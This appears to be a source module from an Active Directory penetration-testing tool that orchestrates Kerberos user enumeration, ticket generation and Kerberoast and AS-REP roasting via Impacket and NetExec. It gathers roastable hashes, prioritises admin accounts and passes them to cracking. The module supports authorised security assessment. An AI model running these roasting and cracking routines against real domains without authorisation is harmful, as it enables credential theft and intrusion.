"""CLI orchestration for Kerberos operations.

This module keeps interactive CLI concerns (printing, reporting, file persistence)
separate from the Kerberos service layer. It handles:
- Kerberos enumeration and user enumeration
- Kerberos ticket generation and management
- Kerberoast and ASREPRoast attacks
- Kerberos environment setup and validation
- LDAP-related Kerberos operations

It uses:
- adscan_internal.services.enumeration.kerberos for enumeration logic
- adscan_internal.services.kerberos_ticket_service for ticket operations
- adscan_internal.cli.ldap for LDAP-related Kerberos operations
"""

from __future__ import annotations

from collections.abc import Callable
import os
import re
import shutil
import socket
import subprocess
import time
from pathlib import Path
from typing import Protocol

import rich.box
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.text import Text

from adscan_internal import (
    print_error,
    print_info,
    print_warning,
    telemetry,
)
from adscan_internal.rich_output import (
    mark_sensitive,
    print_panel,
    print_info_debug,
    print_info_verbose,
    print_success_verbose,
    print_warning_debug,
    print_warning_verbose,
)
from adscan_internal.cli.common import build_lab_event_fields
from adscan_internal.services import CredentialService, EnumerationService
from adscan_internal.integrations.impacket import (
    ImpacketContext,
    ImpacketRunner,
    extract_kerberoast_candidate_users,
    parse_asreproast_output,
    parse_kerberoast_output,
)
from adscan_internal.workspaces import (
    DEFAULT_DOMAIN_LAYOUT,
    domain_relpath,
    domain_subpath,
)


class KerberosShell(Protocol):
    """Minimal shell surface used by the Kerberos CLI controller.

    This protocol unifies the requirements for both general Kerberos operations
    and roasting attacks (Kerberoast/ASREPRoast).
    """

    console: object
    domains: list[str]
    domains_dir: str
    kerberos_dir: str
    cracking_dir: str
    domain: str | None
    type: str | None
    auto: bool
    scan_mode: str | None
    current_workspace_dir: str | None
    domains_data: dict
    netexec_path: str | None
    impacket_scripts_dir: str | None
    command_runner: object
    license_mode: object

    def _questionary_select(
        self, title: str, options: list[str], default_idx: int = 0
    ) -> int | None: ...

    def _get_workspace_cwd(self) -> str: ...

    def _get_service_executor(
        self,
    ) -> Callable[[str, int], subprocess.CompletedProcess[str]]: ...

    def _get_lab_slug(self) -> str | None: ...

    def _get_license_mode_enum(self) -> object: ...

    def run_command(
        self, command: str, timeout: int | None = None, cwd: str | None = None
    ) -> subprocess.CompletedProcess[str] | None: ...

    def do_sync_clock_with_pdc(self, domain: str, verbose: bool = False) -> bool: ...

    def _display_items(self, items: list[str], label: str) -> None: ...

    def get_domain_admins(self, domain: str) -> list[str]: ...

    def build_auth_impacket(
        self, username: str, password: str, domain: str, kerberos: bool = False
    ) -> str: ...

    dcsync_dir: str

    def ask_for_kerberos_user_enum(
        self, domain: str, relaunch: bool = False
    ) -> None: ...

    def do_enum_with_users(self, domain: str) -> None: ...

    def build_auth_nxc(
        self, username: str, password: str, domain: str, kerberos: bool = True
    ) -> str: ...

    def build_auth_impacket_no_host(
        self, username: str, password: str, domain: str, kerberos: bool = True
    ) -> str: ...

    def check_high_value(
        self, domain: str, username: str, *, logging: bool = True
    ) -> bool: ...

    def update_report_field(self, domain: str, field: str, value: object) -> None: ...

    def ask_for_cracking(
        self,
        roast_type: str,
        domain: str,
        hashes_file: str,
        *,
        confirm: bool = True,
    ) -> None: ...


def detect_kerberos_time_error(stdout: str | None, stderr: str | None) -> bool:
    """Return True if output indicates a Kerberos time synchronization error.

    Args:
        stdout: Process stdout.
        stderr: Process stderr.

    Returns:
        True if a Kerberos clock-skew / ticket-not-yet-valid error is detected.
    """
    combined = f"{stdout or ''}\n{stderr or ''}".lower()
    patterns = (
        "clock skew too great",
        "ticket not yet valid",
        "krb_ap_err_skew",  # KRB_AP_ERR_SKEW
        "krb_ap_err_tkt_nyv",  # ticket not yet valid
    )
    return any(pattern in combined for pattern in patterns)


def ensure_kerberos_output_dir(shell: KerberosShell, domain: str) -> str:
    """Ensure the kerberos output directory exists for a given domain.

    Args:
        shell: Shell instance with workspace and domain configuration.
        domain: Domain name.

    Returns:
        Relative path 'domains/<domain>/kerberos' (from workspace root).
    """
    output_dir = domain_relpath(
        shell.domains_dir, domain, DEFAULT_DOMAIN_LAYOUT.kerberos
    )
    workspace_cwd = shell.current_workspace_dir or shell._get_workspace_cwd()
    output_dir_abs = domain_subpath(
        workspace_cwd, shell.domains_dir, domain, DEFAULT_DOMAIN_LAYOUT.kerberos
    )
    try:
        os.makedirs(output_dir_abs, exist_ok=True)
    except OSError as exc:
        telemetry.capture_exception(exc)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"Unable to prepare kerberos output directory for {marked_domain}: {exc}"
        )
    return output_dir


# Note: execute_kerberos_enum_users is a legacy function that appears to be unused.
# The modern approach uses run_kerberos_enum_users from adscan_internal.cli.ldap
# which delegates to the EnumerationService.kerberos.enumerate_users_kerberos service.
# If this function is still needed, it should be refactored to use the service layer.


def ask_for_kerberos_user_enum(
    shell: KerberosShell, domain: str, relaunch: bool = False
) -> None:
    """Prompt user to enumerate domain users via Kerberos.

    This function delegates to run_kerberos_enum_users in adscan_internal.cli.ldap,
    which uses the EnumerationService.kerberos service for the actual enumeration.

    Args:
        shell: Shell instance with domain data and workspace configuration.
        domain: Target domain name.
        relaunch: Whether this is a retry/relaunch of enumeration.
    """
    if shell.domains_data[domain]["auth"] in ["auth", "pwned", "with_users"]:
        return

    from adscan_internal.rich_output import confirm_operation
    from adscan_internal.workspaces import domain_subpath

    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")

    if confirm_operation(
        operation_name=f"Kerberos User Enumeration {'(Retry)' if relaunch else ''}",
        description="Enumerates valid domain users by testing Kerberos pre-authentication",
        context={
            "Domain": domain,
            "PDC": pdc,
            "Protocol": "Kerberos/88",
            "Method": "AS-REQ pre-auth testing",
            "Mode": "Additional users" if relaunch else "Initial enumeration",
        },
        default=True,
        icon="👤",
    ):
        workspace_cwd = shell.current_workspace_dir or shell._get_workspace_cwd()
        kerberos_path = domain_subpath(
            workspace_cwd, shell.domains_dir, domain, shell.kerberos_dir
        )

        if not os.path.exists(kerberos_path):
            os.makedirs(kerberos_path)

        # Delegate to the LDAP CLI module which uses the EnumerationService
        from adscan_internal.cli.ldap import run_kerberos_enum_users

        run_kerberos_enum_users(shell, domain)


def auto_generate_kerberos_ticket(
    shell: KerberosShell,
    username: str,
    credential: str,
    domain: str,
    dc_ip: str | None = None,
) -> str | None:
    """Automatically generate Kerberos ticket based on credential type.

    This function wraps KerberosTicketService.auto_generate_tgt to provide
    a CLI-friendly interface with proper error handling and user feedback.

    Args:
        shell: Shell instance with workspace configuration.
        username: Username for authentication.
        credential: Password or NTLM hash.
        domain: Domain name.
        dc_ip: Optional Domain Controller IP address.

    Returns:
        Path to the created ccache file, or None if failed.
    """
    from adscan_internal.services.kerberos_ticket_service import (
        KerberosTicketService,
    )
    from adscan_internal.rich_output import mark_sensitive, print_warning

    try:
        service = KerberosTicketService()
        result = service.auto_generate_tgt(
            username=username,
            credential=credential,
            domain=domain,
            workspace_dir=shell.current_workspace_dir or shell._get_workspace_cwd(),
            dc_ip=dc_ip,
        )
        if result.success:
            return result.ticket_path
        if result.error_message:
            marked_username = mark_sensitive(username, "user")
            marked_domain = mark_sensitive(domain, "domain")
            print_warning(
                "Failed to auto-generate Kerberos ticket for "
                f"{marked_username}@{marked_domain}: {result.error_message}"
            )
            return None

    except Exception as e:
        telemetry.capture_exception(e)
        marked_username = mark_sensitive(username, "user")
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            f"Failed to auto-generate Kerberos ticket for {marked_username}@{marked_domain}: {e}"
        )
        return None


def ensure_kerberos_environment_for_command(
    shell: KerberosShell,
    domain: str,
    user_domain: str,
    username: str | None = None,
    command_name: str = "kerberos command",
) -> bool:
    """Ensure Kerberos environment is ready before executing Kerberos commands.

    This function wraps KerberosTicketService to set up and validate the
    Kerberos environment (KRB5_CONFIG and KRB5CCNAME) for command execution.

    Args:
        shell: Shell instance with workspace and domain configuration.
        domain: Target domain name.
        user_domain: Domain used to look up stored tickets.
        username: Optional username for Kerberos operations.
        command_name: Name of the command being executed (for logging).

    Returns:
        True if environment is ready, False otherwise.
    """
    from adscan_internal.services.kerberos_ticket_service import (
        KerberosEnvironmentStatus,
        KerberosTicketService,
    )
    from adscan_internal.rich_output import (
        mark_sensitive,
        print_info_verbose,
        print_warning,
    )

    try:
        service = KerberosTicketService()

        # Set up the environment (workspace krb5.conf + ticket if available)
        _krb5_config_set, _ticket_set, _conf_path, _ticket_path = (
            service.setup_environment_for_domain(
                workspace_dir=shell.current_workspace_dir or shell._get_workspace_cwd(),
                domain=domain,
                user_domain=user_domain,
                username=username,
                domains_data=shell.domains_data,
            )
        )

        # Validate the resulting environment
        status: KerberosEnvironmentStatus = service.validate_environment(
            username=username
        )

        if status.ready_for_kerberos_commands:
            return True

        print_warning(f"Kerberos environment not ready for {command_name}")
        for issue in status.issues:
            print_info_verbose(f"Issue: {issue}")

        # Provide a slightly more user-friendly hint if no ticket is ready
        if username and not status.kerberos_ticket_ready:
            marked_username = mark_sensitive(username, "user")
            marked_domain = mark_sensitive(domain, "domain")
            print_info_verbose(
                f"No Kerberos ticket available for {marked_username}@{marked_domain}. "
                "You may need to generate a TGT first."
            )
            return False

    except Exception as e:
        telemetry.capture_exception(e)
        print_warning(f"Error ensuring Kerberos environment for {command_name}: {e}")
    return False


def _print_roast_choice_help(
    default_choice: str,
    selection_options: list[str],
    *,
    priority_available: bool,
) -> None:
    """Render a short helper panel for cracking choices."""
    option_text = {
        "recommended": "Admins + users with attack paths (fastest impact).",
        "all": "All roastable users (slowest).",
        "specific": "Choose a comma-separated list of usernames.",
        "none": "Skip cracking for now.",
    }
    lines = ["[bold]Choose which users to crack[/bold]"]
    for option in selection_options:
        description = option_text.get(option, "")
        lines.append(f"[cyan]{option}[/cyan] — {description}")
    if not priority_available and "recommended" in selection_options:
        lines.append(
            "[yellow]No recommended users detected; default set to all.[/yellow]"
        )
    lines.append(f"[dim]Default: {default_choice}[/dim]")
    print_panel("\n".join(lines), title="Cracking Options", expand=False)


# ============================================================================
# Roasting Attack Functions (Kerberoast and ASREPRoast)
# ============================================================================


def _load_valid_roast_hash_entries(
    *,
    roast_type: str,
    hashes_file_abs: str,
) -> list[tuple[str, str]]:
    """Return parsed ``(username, hash)`` pairs from one roast output file."""
    if not os.path.exists(hashes_file_abs):
        return []

    try:
        raw = Path(hashes_file_abs).read_text(encoding="utf-8", errors="ignore")
    except OSError as exc:
        telemetry.capture_exception(exc)
        marked_path = mark_sensitive(hashes_file_abs, "path")
        print_info_debug(
            f"[kerberos] Could not read roast hashes file {marked_path}: "
            f"{type(exc).__name__}: {exc}"
        )
        return []

    if roast_type == "kerberoast":
        parsed = parse_kerberoast_output(raw)
        return [
            (item.username.strip(), item.hash_value.strip())
            for item in parsed
            if item.username.strip() and item.hash_value.strip()
        ]

    if roast_type == "asreproast":
        parsed = parse_asreproast_output(raw)
        return [
            (item.username.strip(), item.hash_value.strip())
            for item in parsed
            if item.username.strip() and item.hash_value.strip()
        ]

    return []


def _extract_roast_candidate_users_from_stdout(
    roast_type: str,
    output: str | None,
) -> list[str]:
    """Extract roastable usernames from raw tool stdout without shell pipelines."""
    if not output:
        return []

    if roast_type == "kerberoast":
        return extract_kerberoast_candidate_users(output)

    if roast_type == "asreproast":
        return [item.username for item in parse_asreproast_output(output) if item.username]

    return [line.strip() for line in output.splitlines() if line.strip()]


def finalize_roast_results(
    shell: KerberosShell,
    *,
    domain: str,
    roast_type: str,
    users: list[str],
    auto_crack: bool,
) -> str | None:
    """Finalize roast results: show UI, update report/telemetry, and prepare hashes file.

    Args:
        shell: Shell instance with workspace and domain configuration.
        domain: Target domain name.
        roast_type: Type of roast attack ('kerberoast' or 'asreproast').
        users: List of users found to be roastable.
        auto_crack: Whether to automatically prompt for cracking.

    Returns:
        Relative path to hashes file if successful, None otherwise.
    """
    workspace_cwd = shell._get_workspace_cwd()
    hashes_file_abs = domain_subpath(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.cracking_dir,
        f"hashes.{roast_type}",
    )
    hashes_file_rel = domain_relpath(
        shell.domains_dir, domain, shell.cracking_dir, f"hashes.{roast_type}"
    )

    hashes_file_exists = os.path.exists(hashes_file_abs)
    hashes_file_size = 0
    if hashes_file_exists:
        try:
            hashes_file_size = os.path.getsize(hashes_file_abs)
        except (OSError, IOError):
            hashes_file_size = 0

    parsed_hash_entries = _load_valid_roast_hash_entries(
        roast_type=roast_type,
        hashes_file_abs=hashes_file_abs,
    )
    normalized_users = []
    seen_users: set[str] = set()
    for user in users:
        stripped = user.strip() if user else ""
        lowered = stripped.lower()
        if not stripped or lowered in seen_users:
            continue
        normalized_users.append(stripped)
        seen_users.add(lowered)

    hash_users = [username for username, _ in parsed_hash_entries]
    if not normalized_users and hash_users:
        normalized_users = hash_users

    marked_hashes_file = mark_sensitive(hashes_file_rel, "path")
    print_info_debug(
        "[kerberos] Roast result diagnostics: "
        f"type={roast_type}, file={marked_hashes_file}, "
        f"file_exists={hashes_file_exists}, file_size={hashes_file_size}, "
        f"candidate_users={len(normalized_users)}, valid_hashes={len(parsed_hash_entries)}"
    )

    if not normalized_users:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(f"No {roast_type}able users found in domain {marked_domain}")

        try:
            properties = {
                "scan_mode": getattr(shell, "scan_mode", None),
                "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                "workspace_type": getattr(shell, "type", None),
                "auto_mode": getattr(shell, "auto", False),
            }
            properties.update(build_lab_event_fields(shell=shell, include_slug=True))
            telemetry.capture(f"{roast_type}_no_users_found", properties)
        except Exception as e:  # pragma: no cover - best effort
            telemetry.capture_exception(e)

        report_field = roast_type.lower()
        if report_field:
            domain_data = shell.domains_data.get(domain, {})
            if domain_data.get("auth") == "auth":
                value = {
                    "all_users": None,
                    "admin_users": None,
                    "priv_users": None,
                    "general_users": None,
                }
            else:
                value = {"all_users": None}
            shell.update_report_field(domain, report_field, value)
        return None

    from adscan_internal.services.attack_graph_service import (
        has_attack_paths_for_user,
        upsert_roast_entry_edge,
    )

    all_users: list[str] = []
    admin_users: list[str] = []
    privileged_users: list[str] = []
    non_admin_users: list[str] = []

    domain_data = shell.domains_data.get(domain, {})
    if domain_data.get("auth") == "auth":
        for user in normalized_users:
            all_users.append(user)
            if shell.check_high_value(domain, user, logging=False):
                admin_users.append(user)
            else:
                non_admin_users.append(user)

            # Record entry-vector edges for roasting for every discovered user.
            upsert_roast_entry_edge(
                shell,
                domain,
                roast_type=roast_type,
                username=user,
                status="discovered",
            )

        table = Table(
            title=f"[bold blue]{roast_type.capitalize()}able Users in {domain} (Authenticated)[/bold blue]",
            show_header=True,
            header_style="bold magenta",
            box=rich.box.ROUNDED,
            expand=True,
        )
        table.add_column("User", style="cyan")
        table.add_column("Privileges", style="green")
        table.add_column("Attack Path", style="yellow")
        for user in admin_users:
            has_path = "Yes" if has_attack_paths_for_user(shell, domain, user) else "No"
            table.add_row(user, "[bold red]Administrator[/bold red]", has_path)
        for user in privileged_users:
            has_path = "Yes" if has_attack_paths_for_user(shell, domain, user) else "No"
            table.add_row(user, "[yellow]Privileged[/yellow]", has_path)
        for user in non_admin_users:
            has_path = "Yes" if has_attack_paths_for_user(shell, domain, user) else "No"
            table.add_row(user, "[cyan]General[/cyan]", has_path)
        if not (admin_users or privileged_users or non_admin_users):
            shell.console.print(
                Panel(
                    Text(
                        f"No {roast_type}able users found in domain {domain}.",
                        style="yellow",
                    ),
                    border_style="yellow",
                )
            )
        else:
            shell.console.print(Panel(table, border_style="bright_blue", expand=True))
    else:
        table = Table(
            title=f"[bold blue]{roast_type.capitalize()}able Users in {domain} (Guest)[/bold blue]",
            show_header=False,
            header_style="bold magenta",
            box=rich.box.ROUNDED,
            expand=True,
        )
        table.add_column("User", style="cyan")
        for user in normalized_users:
            table.add_row(user)
            all_users.append(user)
            upsert_roast_entry_edge(
                shell,
                domain,
                roast_type=roast_type,
                username=user,
                status="discovered",
            )
        shell.console.print(Panel(table, border_style="bright_blue", expand=True))

    report_field = roast_type.lower()
    if report_field:
        if domain_data.get("auth") == "auth":
            value = {
                "all_users": all_users if all_users else None,
                "admin_users": admin_users if admin_users else None,
                "priv_users": privileged_users if privileged_users else None,
                "general_users": non_admin_users if non_admin_users else None,
            }
        else:
            value = {
                "all_users": all_users if all_users else None,
                "admin_users": "NS",
                "priv_users": "NS",
                "general_users": "NS",
            }
        shell.update_report_field(domain, report_field, value)

    try:
        total_users = len(all_users)
        admin_count = len(admin_users) if domain_data.get("auth") == "auth" else 0
        base_properties = {
            "total_users": total_users,
            "admin_users": admin_count,
            "scan_mode": getattr(shell, "scan_mode", None),
            "auth_type": domain_data.get("auth", "unknown"),
            "workspace_type": getattr(shell, "type", None),
            "auto_mode": getattr(shell, "auto", False),
        }
        base_properties.update(build_lab_event_fields(shell=shell, include_slug=True))
        telemetry.capture(f"{roast_type}_users_found", base_properties)

        # Track TTFH (Time To First Hash) for case study metrics
        # Use scan_start_time (not session_start_time) for accurate timing
        # Use time.monotonic() because system clock may be manipulated for Kerberos
        if (
            hasattr(shell, "_session_first_hash_time")
            and shell._session_first_hash_time is None
            and hasattr(shell, "scan_start_time")
            and shell.scan_start_time is not None
            and total_users > 0
        ):
            import time as time_module

            shell._session_first_hash_time = time_module.monotonic()
            ttfh_seconds = max(
                0.0, shell._session_first_hash_time - shell.scan_start_time
            )
            ttfh_properties = {
                "ttfh_seconds": round(ttfh_seconds, 2),
                "ttfh_minutes": round(ttfh_seconds / 60.0, 2),
                "hash_type": roast_type,
                "hash_count": total_users,
                "scan_mode": getattr(shell, "scan_mode", None),
            }
            ttfh_properties.update(build_lab_event_fields(shell=shell, include_slug=True))
            telemetry.capture("metric_ttfh", ttfh_properties)

        # Track hash count for case study metrics
        if hasattr(shell, "_session_hashes_count"):
            shell._session_hashes_count += total_users

    except Exception as e:  # pragma: no cover - best effort
        telemetry.capture_exception(e)

    if not parsed_hash_entries:
        print_warning(
            f"Roastable users were discovered, but no valid {roast_type} hashes were written to "
            f"{marked_hashes_file}. Skipping cracking."
        )
        return None

    try:
        updated_hashes: list[str] = [
            f"{username}:{hash_value}" for username, hash_value in parsed_hash_entries
        ]

        with open(hashes_file_abs, "w", encoding="utf-8") as f:
            for entry in updated_hashes:
                f.write(f"{entry}\n")

        if auto_crack:
            priority_users = {
                user.lower()
                for user in (admin_users + privileged_users + non_admin_users)
                if user in admin_users or has_attack_paths_for_user(shell, domain, user)
            }
            priority_list = [
                user for user in all_users if user.lower() in priority_users
            ]

            if shell.auto:
                default_choice = (
                    "all" if getattr(shell, "type", "") == "ctf" else "recommended"
                )
            else:
                default_choice = "recommended"

            selection_options = ["recommended", "all", "specific", "none"]
            if not priority_list:
                selection_options = ["all", "specific", "none"]
                default_choice = "all"

            if shell.auto:
                choice = default_choice
                print_info_verbose(f"Auto-selected cracking option: {choice}")
            else:
                if hasattr(shell, "_questionary_select"):
                    option_descriptions = {
                        "recommended": "Admins + users with attack paths (fastest impact)",
                        "all": "All roastable users (slowest)",
                        "specific": "Choose a comma-separated list of usernames",
                        "none": "Skip cracking for now",
                    }
                    options = [
                        f"{option} — {option_descriptions.get(option, '')}".strip()
                        for option in selection_options
                    ]
                    default_idx = selection_options.index(default_choice)
                    selected_idx = shell._questionary_select(
                        "Crack which users?", options, default_idx=default_idx
                    )
                    if selected_idx is None:
                        choice = default_choice
                    else:
                        choice = selection_options[selected_idx]
                else:
                    _print_roast_choice_help(
                        default_choice,
                        selection_options,
                        priority_available=bool(priority_list),
                    )
                    choice = Prompt.ask(
                        "Crack which users?",
                        choices=selection_options,
                        default=default_choice,
                    )

            def _write_subset_file(label: str, selected_users: list[str]) -> str | None:
                if not selected_users:
                    return None
                subset_rel = domain_relpath(
                    shell.domains_dir,
                    domain,
                    shell.cracking_dir,
                    f"hashes.{roast_type}.{label}",
                )
                subset_abs = domain_subpath(
                    workspace_cwd,
                    shell.domains_dir,
                    domain,
                    shell.cracking_dir,
                    f"hashes.{roast_type}.{label}",
                )
                selected_set = {user.lower() for user in selected_users}
                subset_entries = [
                    entry
                    for entry in updated_hashes
                    if entry.split(":", 1)[0].lower() in selected_set
                ]
                if not subset_entries:
                    return None
                with open(subset_abs, "w", encoding="utf-8") as handle:
                    for entry in subset_entries:
                        handle.write(f"{entry}\n")
                return subset_rel

            if choice == "none":
                return hashes_file_rel
            if choice == "recommended":
                subset_file = _write_subset_file("recommended", priority_list)
                if subset_file:
                    shell.ask_for_cracking(
                        roast_type, domain, subset_file, confirm=False
                    )
                else:
                    shell.ask_for_cracking(
                        roast_type, domain, hashes_file_rel, confirm=False
                    )
            elif choice == "specific":
                if shell.auto:
                    shell.ask_for_cracking(
                        roast_type, domain, hashes_file_rel, confirm=False
                    )
                else:
                    selection = Prompt.ask(
                        "Enter usernames (comma-separated)",
                        default=",".join(priority_list) if priority_list else "",
                    )
                    selected = [u.strip() for u in selection.split(",") if u.strip()]
                    subset_file = _write_subset_file("selected", selected)
                    if subset_file:
                        shell.ask_for_cracking(
                            roast_type, domain, subset_file, confirm=False
                        )
                    else:
                        shell.ask_for_cracking(
                            roast_type, domain, hashes_file_rel, confirm=False
                        )
            else:
                shell.ask_for_cracking(
                    roast_type, domain, hashes_file_rel, confirm=False
                )
        return hashes_file_rel
    except FileNotFoundError as e:
        telemetry.capture_exception(e)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(f"No {roast_type}able users found in domain {marked_domain}")
        return None


def run_kerberoast(
    shell: KerberosShell, target_domain: str, *, auto_crack: bool
) -> str | None:
    """CLI entrypoint for Kerberoast using the service layer + local UI.

    Args:
        shell: Shell instance with workspace and domain configuration.
        target_domain: Target domain name.
        auto_crack: Whether to automatically prompt for cracking.

    Returns:
        Relative path to hashes file if successful, None otherwise.
    """
    from adscan_internal import print_operation_header

    if target_domain not in shell.domains:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"Domain '{marked_target_domain}' is not configured. Please add or select a valid domain."
        )
        return None

    if not shell.impacket_scripts_dir:
        print_error(
            "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
        )
        return None

    getuserspns_py_path = os.path.join(shell.impacket_scripts_dir, "GetUserSPNs.py")
    if not os.path.isfile(getuserspns_py_path) or not os.access(
        getuserspns_py_path, os.X_OK
    ):
        print_error(
            f"GetUserSPNs.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
        )
        return None

    workspace_cwd = shell._get_workspace_cwd()
    cracking_path = domain_subpath(
        workspace_cwd, shell.domains_dir, target_domain, shell.cracking_dir
    )
    os.makedirs(cracking_path, exist_ok=True)

    domain_credentials = shell.domains_data.get(target_domain, {})
    username = domain_credentials.get("username") or shell.domains_data.get(
        shell.domain or "", {}
    ).get("username")
    password = domain_credentials.get("password") or shell.domains_data.get(
        shell.domain or "", {}
    ).get("password")

    if not username or not password:
        print_error(
            "Missing credentials for Kerberoast (username/password not configured)."
        )
        return None

    output_file_rel = domain_relpath(
        shell.domains_dir, target_domain, shell.cracking_dir, "hashes.kerberoast"
    )
    output_file_abs = domain_subpath(
        workspace_cwd,
        shell.domains_dir,
        target_domain,
        shell.cracking_dir,
        "hashes.kerberoast",
    )

    print_operation_header(
        "Kerberoast Attack",
        details={
            "Target Domain": target_domain,
            "Username": username,
            "Output": output_file_rel,
        },
        icon="🎫",
    )

    ctx = ImpacketContext(
        impacket_scripts_dir=shell.impacket_scripts_dir,
        validate_script_exists=lambda p: os.path.isfile(p) and os.access(p, os.X_OK),
        get_domain_pdc=lambda d: shell.domains_data.get(d, {}).get("pdc"),
    )
    impacket_runner = ImpacketRunner(command_runner=shell.command_runner)

    enum_service = EnumerationService(license_mode=shell._get_license_mode_enum())
    hashes = enum_service.kerberos.kerberoast(
        domain=target_domain,
        pdc=shell.domains_data[target_domain]["pdc"],
        username=username,
        password=password,
        hashes=None,
        impacket_runner=impacket_runner,
        impacket_context=ctx,
        output_file=Path(output_file_abs),
        scan_id=None,
    )
    # Ensure usernames are in stable order for downstream UI.
    result_users = [h.username for h in hashes]

    try:
        properties = {
            "scan_mode": getattr(shell, "scan_mode", None),
            "auth_type": shell.domains_data[target_domain].get("auth", "unknown"),
            "workspace_type": getattr(shell, "type", None),
            "auto_mode": getattr(shell, "auto", False),
        }
        properties.update(build_lab_event_fields(shell=shell, include_slug=True))
        telemetry.capture("kerberoast_started", properties)
    except Exception as e:  # pragma: no cover - best effort
        telemetry.capture_exception(e)

    if not result_users:
        marked_domain = mark_sensitive(target_domain, "domain")
        print_error(f"No kerberoastable users found in domain {marked_domain}")
        return None

    return finalize_roast_results(
        shell,
        domain=target_domain,
        roast_type="kerberoast",
        users=result_users,
        auto_crack=auto_crack,
    )


def run_asreproast(
    shell: KerberosShell, target_domain: str, *, auto_crack: bool
) -> str | None:
    """CLI entrypoint for ASREPRoast using the service layer + local UI.

    Args:
        shell: Shell instance with workspace and domain configuration.
        target_domain: Target domain name.
        auto_crack: Whether to automatically prompt for cracking.

    Returns:
        Relative path to hashes file if successful, None otherwise.
    """
    from adscan_internal import print_operation_header

    if target_domain not in shell.domains:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"Domain '{marked_target_domain}' is not configured. Please add or select a valid domain."
        )
        return None

    workspace_cwd = shell._get_workspace_cwd()
    cracking_path = domain_subpath(
        workspace_cwd, shell.domains_dir, target_domain, shell.cracking_dir
    )
    os.makedirs(cracking_path, exist_ok=True)

    output_file_rel = domain_relpath(
        shell.domains_dir, target_domain, shell.cracking_dir, "hashes.asreproast"
    )
    output_file_abs = domain_subpath(
        workspace_cwd,
        shell.domains_dir,
        target_domain,
        shell.cracking_dir,
        "hashes.asreproast",
    )
    users_file_abs = domain_subpath(
        workspace_cwd, shell.domains_dir, target_domain, "users.txt"
    )

    username_display = (
        shell.domains_data.get(shell.domain or "", {}).get("username", "N/A")
        if shell.domains_data[target_domain].get("auth") == "auth"
        or shell.domains_data[target_domain].get("auth") == "pwned"
        else "Unauthenticated"
    )

    print_operation_header(
        "AS-REP Roasting Attack",
        details={
            "Target Domain": target_domain,
            "Username": username_display,
            "Output": output_file_rel,
        },
        icon="🎟️",
    )

    service = CredentialService()
    executor = shell._get_service_executor()

    auth_mode = shell.domains_data[target_domain].get("auth")
    # Keep legacy behavior for authenticated mode: use NetExec LDAP --asreproast.
    if auth_mode == "auth" or auth_mode == "pwned":
        if not shell.netexec_path:
            print_error(
                "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
            )
            return None
        auth = shell.build_auth_nxc(
            shell.domains_data[shell.domain]["username"],
            shell.domains_data[shell.domain]["password"],
            shell.domain,
            kerberos=False,
        )
        log_file_abs = domain_subpath(
            workspace_cwd,
            shell.domains_dir,
            target_domain,
            shell.cracking_dir,
            "asreproast.log",
        )
        result = service.asreproast(
            domain=target_domain,
            users_file=users_file_abs,
            getnpusers_path="",  # unused in authenticated mode
            output_file=output_file_abs,
            pdc=shell.domains_data[target_domain]["pdc"],
            auth_string=auth,
            netexec_path=shell.netexec_path,
            log_file=log_file_abs,
            executor=executor,
            scan_id=None,
        )
    else:
        if not shell.impacket_scripts_dir:
            print_error(
                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
            )
            return None
        getnpusers_py_path = os.path.join(shell.impacket_scripts_dir, "GetNPUsers.py")
        if not os.path.isfile(getnpusers_py_path) or not os.access(
            getnpusers_py_path, os.X_OK
        ):
            print_error(
                f"GetNPUsers.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
            )
            return None

        ctx = ImpacketContext(
            impacket_scripts_dir=shell.impacket_scripts_dir,
            validate_script_exists=lambda p: os.path.isfile(p)
            and os.access(p, os.X_OK),
            get_domain_pdc=lambda d: shell.domains_data.get(d, {}).get("pdc"),
        )
        impacket_runner = ImpacketRunner(command_runner=shell.command_runner)
        enum_service = EnumerationService(license_mode=shell._get_license_mode_enum())
        hashes = enum_service.kerberos.asreproast(
            domain=target_domain,
            pdc=shell.domains_data[target_domain]["pdc"],
            usersfile=Path(users_file_abs),
            impacket_runner=impacket_runner,
            impacket_context=ctx,
            output_file=Path(output_file_abs),
            scan_id=None,
        )
        # Use parsed hashes as the user list for UI.
        result_users = [h.username for h in hashes]
        return finalize_roast_results(
            shell,
            domain=target_domain,
            roast_type="asreproast",
            users=result_users,
            auto_crack=auto_crack,
        )

    try:
        properties = {
            "scan_mode": getattr(shell, "scan_mode", None),
            "auth_type": shell.domains_data[target_domain].get("auth", "unknown"),
            "workspace_type": getattr(shell, "type", None),
            "auto_mode": getattr(shell, "auto", False),
        }
        properties.update(build_lab_event_fields(shell=shell, include_slug=True))
        telemetry.capture("asreproast_started", properties)
    except Exception as e:  # pragma: no cover - best effort
        telemetry.capture_exception(e)

    if not result.success:
        print_error(
            f"Error attempting to perform asreproast: {result.error_message or 'Unknown error'}"
        )
        return None

    return finalize_roast_results(
        shell,
        domain=target_domain,
        roast_type="asreproast",
        users=result.roastable_users,
        auto_crack=auto_crack,
    )


def ask_for_asreproast(
    shell: KerberosShell, target_domain: str, *, auto_crack: bool = True
) -> None:
    """Prompt user to perform AS-REP Roasting attack.

    Args:
        shell: Shell instance with workspace and domain configuration.
        target_domain: Target domain name.
        auto_crack: Whether to automatically prompt for cracking.
    """
    from adscan_internal.rich_output import confirm_operation, print_info

    if shell.auto:
        workspace_cwd = shell.current_workspace_dir or shell._get_workspace_cwd()
        hashes_file_abs = domain_subpath(
            workspace_cwd,
            shell.domains_dir,
            target_domain,
            shell.cracking_dir,
            "hashes.asreproast",
        )
        if os.path.exists(hashes_file_abs):
            marked_target_domain = mark_sensitive(target_domain, "domain")
            print_info(
                f"Asreproast for domain {marked_target_domain} has already been performed. Skipping..."
            )
            return
        # Continue with asreproast
